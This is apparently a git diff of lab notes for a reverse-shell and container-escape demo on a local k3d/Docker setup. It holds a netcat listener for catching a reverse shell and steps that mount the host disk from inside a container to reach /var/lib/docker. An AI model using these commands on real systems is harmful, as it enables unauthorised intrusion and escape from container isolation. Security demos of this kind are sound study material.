@@ -1,13 +1,14 @@
 
-# run netcat to capture incomming reverse shell in a new terminal
+# Commands
+## run netcat to capture incomming reverse shell in a new terminal
 nc -lvp <port>
 
-# Ip (docker ip if run with k3d or similar)
+## Ip (docker ip if run with k3d or similar)
 ifconfig | grep docker0 -A 1
 
 Use the docker ip as the <ip>
 
-# Test exploit commands
+** Replace <placeholders> when executing the thing **
 Replace <ip> and <port> with your own values
 
 ## The exploit, run from a vulnerable input prompt
@@ -28,9 +29,4 @@ findfs UUID=b4622f81-d047-4c8b-86ea-a7dcfb3dd58f
 > /dev/sda3
 mkdir /mnt-test && mount /dev/sda3 /mnt-test
 cd /mnt-test/var/lib/docker
-
 ```
-
-# Ebpf one liners with bpftrace
-- list trace points
-    bpftrace -l 'tracepoint:syscalls:sys_enter_*' 
